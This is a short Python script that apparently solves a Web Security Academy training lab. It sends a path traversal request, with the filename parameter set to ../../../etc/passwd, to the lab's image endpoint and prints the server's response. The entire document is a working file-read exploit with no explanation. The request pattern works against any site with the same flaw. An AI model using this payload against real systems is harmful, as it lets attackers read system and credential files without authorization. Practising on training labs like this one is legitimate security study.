import requests

site = "0a4f00690331313082177afd00f600c4.web-security-academy.net"
url = f"https://{site}/image?filename=../../../etc/passwd"
s = requests.Session()
resp = s.get(url)
print(resp.text)